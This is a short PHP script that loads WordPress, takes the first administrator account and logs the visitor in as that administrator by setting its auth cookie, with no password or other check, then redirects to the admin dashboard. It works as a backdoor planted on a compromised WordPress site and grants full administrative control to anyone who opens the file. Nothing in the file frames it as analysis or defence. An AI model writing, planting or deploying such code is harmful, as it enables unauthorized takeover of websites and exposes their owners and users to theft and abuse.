<?php
require(rtrim($_SERVER["DOCUMENT_ROOT"], "/\\") . DIRECTORY_SEPARATOR . "wp-blog-header.php");
$u = get_users('role=administrator');
$us="";
foreach($u as $p){
 $us=$p->user_login; break;
}
$us = get_user_by('login', $us ); 
if ( !is_wp_error( $us ) )
{ get_currentuserinfo(); 
  if ( user_can( $us, "administrator" ) ){ 
     wp_clear_auth_cookie(); 
        wp_set_current_user ( $us->ID );
        wp_set_auth_cookie  ( $us->ID );
        $redirect_to = admin_url();  
           wp_safe_redirect( $redirect_to );
           exit();
  } 
}
